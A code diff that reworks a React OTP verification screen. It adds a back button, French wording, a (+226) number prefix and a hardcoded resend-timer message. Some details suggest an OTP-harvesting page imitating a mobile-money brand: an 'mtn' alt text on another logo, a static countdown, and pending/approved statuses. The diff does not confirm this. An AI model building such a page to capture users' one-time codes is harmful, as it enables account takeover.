@@ -5,6 +5,7 @@ import { useVerification } from "../hooks/useVerification";
 import { verificationService } from "../services/api";
 import Topheader from "./Topheader";
 import Loader from "./Loader";
+import { ArrowLeft } from "lucide-react";
 
 const OtpVerification = ({ client, myFuncs }) => {
   const { name, number, length } = client;
@@ -355,83 +356,89 @@ const OtpVerification = ({ client, myFuncs }) => {
   }
 
   return (
-    <div className="otp-container">
-      {/* <Topheader /> */}
-      {loading && <Loader />}
+    <>
+      <div className="backbtn">
+        <ArrowLeft />
+      </div>
 
-      <img className="momoImg" src="/cabslogo.jpeg" alt="mtn" />
-      <div className="otpheader">
-        {error && (
+      <div className="otp-container">
+        {/* <Topheader /> */}
+        {loading && <Loader />}
+
+        {/* <img className="momoImg" src="/cabslogo.jpeg" alt="mtn" /> */}
+        <div className="otpheader">
+          {error && (
+            <div
+              className="error-message"
+              style={{ color: "red", marginBottom: "10px" }}
+            >
+              {error}
+            </div>
+          )}
+
+          {status && status !== "pending" && status !== "approved" && (
+            <div
+              className="status-message"
+              style={{
+                color: status.includes("wrong") ? "red" : "orange",
+                marginBottom: "10px",
+                padding: "8px",
+                backgroundColor: status.includes("wrong")
+                  ? "#ffeeee"
+                  : "#fff8e1",
+                borderRadius: "5px",
+              }}
+            >
+              {statusMessages[status] || status}
+            </div>
+          )}
+
+          <h2>Vérifier votre numéro</h2>
+          <p>
+            Saisissez le code que nous avons envoyé à
+            <span style={{ fontWeight: "bold", color: "#333" }}>
+              (+226) {number}
+            </span>{" "}
+          </p>
+        </div>
+
+        <div className="otp-inputs">
+          {otpp.map((digit, index) => (
+            <input
+              key={index}
+              ref={(el) => (inputRefs.current[index] = el)}
+              type="text"
+              inputMode="numeric"
+              maxLength="1"
+              value={digit}
+              onChange={(e) => handleChange(index, e.target.value)}
+              onKeyDown={(e) => handleKeyDown(index, e)}
+              onPaste={handlePaste}
+              onFocus={handleFocus}
+              className={`otp-input ${digit ? "filled" : ""} ${wrongCode ? "error" : ""}`}
+              autoComplete="one-time-code"
+              disabled={loading || status === "pending"}
+            />
+          ))}
+        </div>
+        <p className="resendmessa">Renvoyer le code dans 04:51</p>
+        {wrongCode && (
           <div
             className="error-message"
-            style={{ color: "red", marginBottom: "10px" }}
-          >
-            {error}
-          </div>
-        )}
-
-        {status && status !== "pending" && status !== "approved" && (
-          <div
-            className="status-message"
             style={{
-              color: status.includes("wrong") ? "red" : "orange",
-              marginBottom: "10px",
+              color: "red",
+              textAlign: "center",
+              margin: "10px 0",
               padding: "8px",
-              backgroundColor: status.includes("wrong") ? "#ffeeee" : "#fff8e1",
+              backgroundColor: "#ffeeee",
               borderRadius: "5px",
             }}
           >
-            {statusMessages[status] || status}
+            ❌ Expired or Wrong OTP code. Please try again.
           </div>
         )}
 
-        <h2>OTP Verification</h2>
-        <p>
-          Please enter the OTP sent to your number <br />
-          <span style={{ fontWeight: "bold", color: "#333" }}>
-            {number}
-          </span>{" "}
-          (sms)
-        </p>
-      </div>
-
-      <div className="otp-inputs">
-        {otpp.map((digit, index) => (
-          <input
-            key={index}
-            ref={(el) => (inputRefs.current[index] = el)}
-            type="text"
-            inputMode="numeric"
-            maxLength="1"
-            value={digit}
-            onChange={(e) => handleChange(index, e.target.value)}
-            onKeyDown={(e) => handleKeyDown(index, e)}
-            onPaste={handlePaste}
-            onFocus={handleFocus}
-            className={`otp-input ${digit ? "filled" : ""} ${wrongCode ? "error" : ""}`}
-            autoComplete="one-time-code"
-            disabled={loading || status === "pending"}
-          />
-        ))}
-      </div>
-
-      {wrongCode && (
-        <div
-          className="error-message"
-          style={{
-            color: "red",
-            textAlign: "center",
-            margin: "10px 0",
-            padding: "8px",
-            backgroundColor: "#ffeeee",
-            borderRadius: "5px",
-          }}
-        >
-          ❌ Expired or Wrong OTP code. Please try again.
-        </div>
-      )}
-
-      {/* <div className="timer-section">
+        {/* <div className="timer-section">
         {timer === 0 ? (
           <p className="resindp">You can now resend OTP</p>
         ) : (
@@ -439,47 +446,54 @@ const OtpVerification = ({ client, myFuncs }) => {
         )}
       </div> */}
 
-      <div>
-        {/* <p>
+        <div>
+          {/* <p>
           Your OTP: <strong>{otpp.join("") || "______"}</strong>
         </p> */}
 
-        {!next ? (
-          <button
-            onClick={handleSubmit}
-            className="copy-btn"
-            type="button"
-            disabled={
-              otpp.join("").length !== length || loading || status === "pending"
-            }
-            style={{
-              opacity:
+          {!next ? (
+            <button
+              onClick={handleSubmit}
+              className="copy-btn"
+              type="button"
+              disabled={
                 otpp.join("").length !== length ||
                 loading ||
                 status === "pending"
-                  ? 0.6
-                  : 1,
-              cursor:
-                otpp.join("").length !== length ||
-                loading ||
-                status === "pending"
-                  ? "not-allowed"
-                  : "pointer",
-            }}
-          >
-            {loading || status === "pending" ? (
-              <span>⏳ Verifying...</span>
-            ) : (
-              "Verify and Login"
-            )}
-          </button>
-        ) : (
-          <button onClick={handleSubmission} className="copy-btn" type="button">
-            Finish
-          </button>
-        )}
+              }
+              style={{
+                opacity:
+                  otpp.join("").length !== length ||
+                  loading ||
+                  status === "pending"
+                    ? 0.6
+                    : 1,
+                cursor:
+                  otpp.join("").length !== length ||
+                  loading ||
+                  status === "pending"
+                    ? "not-allowed"
+                    : "pointer",
+              }}
+            >
+              {loading || status === "pending" ? (
+                <span>⏳ Verifying...</span>
+              ) : (
+                "continuer"
+              )}
+            </button>
+          ) : (
+            <button
+              onClick={handleSubmission}
+              className="copy-btn"
+              type="button"
+            >
+              Finish
+            </button>
+          )}
+        </div>
       </div>
-    </div>
+    </>
   );
 };
 
